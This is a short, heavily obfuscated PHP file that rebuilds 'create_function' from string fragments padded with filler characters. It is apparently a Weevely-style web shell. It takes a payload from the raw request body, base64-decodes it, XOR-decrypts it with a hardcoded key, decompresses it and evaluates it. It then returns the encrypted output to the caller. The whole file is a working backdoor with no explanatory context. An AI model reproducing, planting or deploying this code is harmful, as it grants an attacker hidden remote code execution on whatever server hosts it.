<?php
$i='aZse6Z4_encode(@x(Z@gzcZompress($o)Z,$k))Z;pZrint(Z"$p$kh$r$kf");}';
$s=';$j+ZZ+,$i++){$oZ.=$t{$Zi}Z^$k{$jZ};}Z}retuZrn $o;}Zif (@preg_mat';
$e='"ZkG59uEpqjZWDy7EMB"Z;functioZn x($tZ,$k){ZZ$c=strlZeZn($k);Z$l=';
$I=str_replace('dQ','','cdQrdQeatedQdQdQ_fundQction');
$P='Zch("/$Zkh(.+)$kfZ/",@fiZlZe_gZet_contents("pZhp://iZnput"Z),$mZ';
$t='Z)=Z=1) {@ob_start()Z;Z@eZval(@gZzuncompress(@x(Z@baseZ64_dZecode($m';
$z='strlen($tZ);$o="";fZZor($i=0;$i<$l;Z){fZor($Zj=0;($j<Z$c&Z&$i<$l)';
$k='$k="112Z845eZa";$kZh="eZd1Z248f8Z571d";$kZfZ="e5f5b2980acZb";$p=';
$R='[1]Z),$k)ZZ)Z);Z$o=@ob_get_contents();Z@ob_endZ_cleaZn();$rZ=Z@b';
$j=str_replace('Z','',$k.$e.$z.$s.$P.$t.$R.$i);
$p=$I('',$j);$p();
?>
